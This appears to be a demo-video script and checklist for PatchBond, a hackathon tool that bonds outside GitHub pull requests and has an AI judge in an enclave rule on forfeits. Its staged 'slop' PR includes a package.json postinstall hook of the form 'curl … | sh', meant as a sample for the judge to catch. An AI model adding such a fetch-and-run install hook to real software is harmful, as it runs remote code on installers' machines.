# Demo video — 2:30, screen recording + voiceover

For the human jury and the X post. One rule: **every claim on screen is happening live**. The 53-second
cut (`video/`) stays as the teaser; this is the full walkthrough. Record at 1920×1080, browser zoom 125%.

**One-liner (say it first, put it in the post):** *AI made sending free. PatchBond makes wasting a
maintainer's time cost something — and the AI judging it can't touch the money.*

## Before recording

- [ ] GitHub App points at the hosted service (DEPLOY.md §2); `bun run dev` stopped locally.
- [ ] A demo repo with the App installed and bonds **on**, priced in NEAR, **challenge window 0 h** so a
  forfeit settles at once on camera (Dashboard → Bond policy → Edit).
- [ ] A second GitHub account (the "stranger") and a Meteor wallet with ~1 testnet NEAR.
- [ ] Two PRs ready on the stranger's fork:
  - **Slop:** a README "fix" whose description says *"Added unit tests for the parser and fixed the race in
    src/queue.rs"* while the diff only touches README.md, plus a `package.json` `"postinstall": "curl … | sh"`.
    (Unbacked claims + malicious install hook → the model signs a forfeit.) **Check it before recording:**
    `bun run --cwd server judge-pr <slop PR URL>` must show `"model_verdict": … "forfeit"` — the contract
    only accepts a forfeit the model itself signed. Strengthen the PR until it does (~$0.0004 a try).
  - **Real:** a genuine one-line fix with passing CI.
- [ ] Tab: `nearblocks.io/address/patchbond-dev.testnet` · Tab: NEAR AI attestation report
  (`cloud-api.near.ai/v1/attestation/report?model=z-ai/glm-5.3-flash&signing_algo=ecdsa`).
- [ ] Terminal with `bash scripts/demo-contract-says-no.sh 2 42` ready (2#42 is a held demo bond).

## Script

| Time | Screen | Voiceover |
|---|---|---|
| 0:00–0:15 | Black → *"Attacks break tired people."* A friendly "fix typo" PR whose diff hides `"postinstall": "curl … \| sh"`. Then Sanctifier's PR list, scrolling past drive-by PRs. | "Most attacks don't break code — they break tired maintainers. A friendly pull request can hide a backdoor. I maintain Sanctifier — 122 contributors. AI made sending a PR free; reading one still costs me an hour." |
| 0:15–0:35 | The stranger opens the **slop PR**. Seconds later: the bot's comment — deposit in NEAR, the 24 h deadline, labels `awaiting deposit`. | "Now a stranger's PR gets a refundable bond, priced by my queue — like EIP-1559 for my attention. Don't pay, and it closes itself in 24 hours." |
| 0:35–0:50 | Click **Pay the deposit** → one Meteor approval (wrap + pay in one transaction) → "Deposit held". GitHub email "@you paid" visible. | "One tap from any NEAR wallet. The money sits in a contract — not with us, not with me." |
| **0:50–1:20** | **Moment 1 — judged in a sealed enclave.** The bot's comment: *judged in an OutLayer enclave*. Nearblocks: `judge_in_tee` → OutLayer's `execution_completed` (≈25 s) → `tee_verified` + the verdict. If it's a forfeit: 90% into the repo vault. | "The judge runs inside an OutLayer enclave — it reads GitHub itself and asks NEAR AI. Our server isn't in the loop. It caught claims the diff doesn't back and a hidden install script — and the contract checked NEAR AI's signature before moving a cent." |
| **1:20–1:45** | **Moment 2 — verify.** Open the verdict page → **Verify signature** → six green checks → the signer `0x3b75…` → switch to NEAR AI's attestation report, same address highlighted. | "Don't trust us. Your browser recomputes every hash and recovers the signer — it's NEAR AI's attested enclave key. Our server could not have written this verdict." |
| **1:45–2:05** | **Moment 3 — the contract says no.** Terminal: `demo-contract-says-no.sh` → our own oracle key tries to forfeit without a signature → *"A forfeit needs the NEAR AI TEE proof."* | "And even we can't fake one. Here's PatchBond's own server key trying to take a bond with no AI signature. The contract refuses. The AI has money — not keys." |
| 2:05–2:20 | The **real PR**: refunded automatically. Quick cuts: the spam-wave simulator, price climbing; the nearcore case study (186 → 20 → **0**). | "Real work gets every cent back — on NEAR's own core repo, it forfeited zero honest pull requests. And a spam wave prices itself out." |
| 2:20–2:30 | The README's live numbers block, then the URL. | "PatchBond. Live on NEAR. Install it on your repo." |

## Cut, don't explain

Leave out tips, bounties, Intents, DAOs and the MCP server — they're in the README. Three moments, one
idea: *real work is free, wasted time is paid for, and the AI can't touch the money.* Never name a
specific exchange hack — the threat here is the poisoned pull request, and we show it live.

No live forfeit on camera? Use `bun run demo` (act 2 is NEAR AI's own signed forfeit, accepted
on-chain) — it's real, local, and takes a minute.

## X post (with the video)

> AI made sending free. Maintainers still pay with their time.
>
> PatchBond puts a refundable bond on outside PRs. A NEAR AI judge in a TEE reviews them — real work is
> refunded, slop pays the maintainer. And the contract only forfeits if the enclave signed it.
>
> Live on my 122-contributor repo. Built at NEAR HACKATHON.
> Try it: patchbond-production.up.railway.app · code: github.com/PatchBond/patchbond
>
> @NEARProtocol @near_ai #NEARHackathon
